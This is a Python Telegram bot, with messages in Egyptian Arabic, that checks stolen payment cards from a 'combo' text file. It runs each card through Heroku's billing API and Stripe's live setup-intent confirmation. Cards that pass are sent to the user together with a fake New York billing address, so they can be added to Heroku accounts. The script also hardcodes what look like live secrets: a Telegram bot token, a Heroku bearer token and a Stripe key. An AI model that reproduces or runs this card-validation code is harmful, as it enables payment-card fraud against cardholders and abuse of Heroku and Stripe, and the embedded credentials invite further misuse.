import telebot,requests,re,random
from telebot import types
tok='6783480953:AAHyBVhmv--wdAk-C_jCVocAaIjBkcI3ey8'
bot=telebot.TeleBot(tok)
@bot.message_handler(commands=['start'])
def start(message):
        idd = message.from_user.id
        first = message.from_user.first_name
        last = message.from_user.last_name
        if "None" in str(last):
            last = ""
        url = f"tg://user?id={idd}"
        ms = types.InlineKeyboardMarkup(row_width=2)
        cc2 = types.InlineKeyboardButton('GET VISA ',callback_data='dsa')
        armx = types.InlineKeyboardButton('ARMX STAR', url='https://t.me/T4_Mohamed')
        ms.add(armx,cc2)
        bot.reply_to(message,
                   f"""أهلا  [{first + last}]({url}) 
اقدر اطلع لك فيزا تضيفها ف هيروكو ما عليك غير انك تبعتلي الامر دا
/visaa""",
              reply_markup=ms , parse_mode="markdown")

@bot.message_handler(commands=['visaa'])
def visaas(message):
        global on
        on=True
        if on==True:
            with open('cc.txt', 'r') as file:
                lines = file.readlines()  
            random.shuffle(lines)
            with open('cc.txt', 'w') as file:
                file.writelines(lines)  
            idd = message.from_user.id
            first = message.from_user.first_name
            last = message.from_user.last_name
            if "None" in str(last):
                last = ""
            url = f"tg://user?id={idd}"
            ms = types.InlineKeyboardMarkup(row_width=1)
            armx = types.InlineKeyboardButton('ARMX STAR', url='https://t.me/UD_UC')
            ms.add(armx)
            bot.send_message(message.chat.id,
                    f"""أهلا  [{first + last}]({url}) 
    استني عليا بق لغاية ما اطلعلك فيزا 
    انا بفحص من كومبو فيز متنتظرنيش لما اطلعلك واحده هبعتلك رساله متقلقش""",
                    reply_markup=ms , parse_mode="markdown")
            file=open('cc.txt',"+r")
            for P in file.readlines():
                fcc=P
                cc = P.split('|')[0]
                mes=P.split('|')[1]
                ano=P.split('|')[2]
                if len(ano)==4:
                    ano=ano.replace('20','')
                cvv=P.split('|')[3].replace('\n', '')
                P=P.replace('\n', '')
                r=requests.session()
                headers = {
                    'authority': 'api.heroku.com',
                    'accept': 'application/vnd.heroku+json; version=3',
                    'accept-language': 'en-US,en;q=0.6',
                    'authorization': 'Bearer c365ca73-a5aa-43d5-9dd8-58fd2bdceca9',
                    'origin': 'https://dashboard.heroku.com',
                    'referer': 'https://dashboard.heroku.com/',
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'x-heroku-requester': 'dashboard',
                    'x-origin': 'https://dashboard.heroku.com',
                }
                response = r.post('https://api.heroku.com/account/payment-method/client-token', headers=headers)
                try:
                    secret=response.json()['token']
                    pi=re.findall(r'(.*?)_secret_',secret)[0]
                except:
                    bot.send_message(message.chat.id,'ERROR IN BARER')
                    return
            
                headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.6',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                }
                data = f'type=card&billing_details[name]=ARMX+STAR&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=9de26596-af31-4dbf-9f76-8ccfecda37ff0e20f8&muid=65bbd29d-48f0-4213-ba4f-d24cf7ae60fd701976&sid=6756df8b-1e5a-460c-b628-dc8eff04567ac70f0b&pasted_fields=number%2Ccvc&payment_user_agent=stripe.js%2Fc973c0a0ca%3B+stripe-js-v3%2Fc973c0a0ca%3B+split-card-element&referrer=https%3A%2F%2Fdashboard.heroku.com&time_on_page=787301&key=pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn'
                response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
                try:
                    id=response.json()['id']
                except:
                    continue
                headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.6',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                }
                data = {
                    'payment_method': id,
                    'expected_payment_method_type': 'card',
                    'use_stripe_sdk': 'true',
                    'key': 'pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn',
                    'client_secret': secret,
                }
                response = requests.post(
                    f'https://api.stripe.com/v1/setup_intents/{pi}/confirm',
                    headers=headers,
                    data=data,
                ).text
                url = f"tg://user?id={idd}"
                ms = types.InlineKeyboardMarkup(row_width=1)
                armx = types.InlineKeyboardButton('ARMX STAR', url='https://t.me/UD_UC')
                ms.add(armx)
                if '"status": "succeeded"' in response:
                    bot.send_message(message.chat.id,
                    f"""أهلا  [{first + last}]({url}) 
خد فيزا اهي روح ضيفها دالوقتي متجيش بعد شويه وتقولي الفيزا م شغاله 
𝑽𝑰𝑺𝑨: {fcc}
𝑨𝑫𝑫𝑹𝑬𝑺𝑺: New York
𝑷𝑶𝑺𝑻𝑨𝑳 𝑪𝑶𝑫𝑬: 10080
New York بص يحج لما تيجي تحط العنوان تحط كله
 والرمز البريدي 10080 """,reply_markup=ms , parse_mode="markdown")
                    print(fcc+'APPROVED')
                    on=False
                    return
                else:
                    print(fcc+'declined')

@bot.callback_query_handler(func=lambda call: True)
def handle_button_click(call):
    if call.data == 'dsa':
        visaas(call.message)
        
bot.infinity_polling()
